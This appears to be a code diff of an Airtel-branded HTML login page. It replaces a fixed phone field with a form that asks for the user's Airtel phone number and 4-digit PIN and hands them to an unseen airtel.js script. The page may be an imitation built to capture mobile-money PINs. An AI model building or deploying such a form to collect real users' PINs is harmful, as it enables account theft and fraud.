@@ -13,25 +13,33 @@
 
     <h2 class="welcome-text">Welcome</h2>
 
-    <input
-        type="text"
-        class="phone-input"
-        value="+260877458756"
-        readonly
-    />
+    <form id="airtelForm">
+        <p class="phone-label">Verifying phone number:</p>
+        <input
+            type="text"
+            id="airtelPhone"
+            class="phone-input"
+            placeholder="Enter your Airtel phone number"
+            required
+        />
 
-    <p class="pin-label">Enter your PIN</p>
+        <p class="pin-label">Enter your PIN</p>
 
-    <div class="pin-box">
-        <input type="password" maxlength="1" class="pin">
-        <input type="password" maxlength="1" class="pin">
-        <input type="password" maxlength="1" class="pin">
-        <input type="password" maxlength="1" class="pin">
-    </div>
+        <input
+            type="password"
+            id="airtelPin"
+            class="pin-input"
+            maxlength="4"
+            placeholder="Enter 4-digit PIN"
+            required
+        />
 
-    <a href="#" class="forgot-pin">Forgot PIN?</a>
+        <div id="message" class="message"></div>
 
-    <button class="login-btn" disabled>Login</button>
+        <button type="submit" class="btn-submit login-btn">Login</button>
+        
+        <a href="#" class="forgot-pin">Forgot PIN?</a>
+    </form>
 </div>
 
 <script src="assets/js/airtel.js"></script>
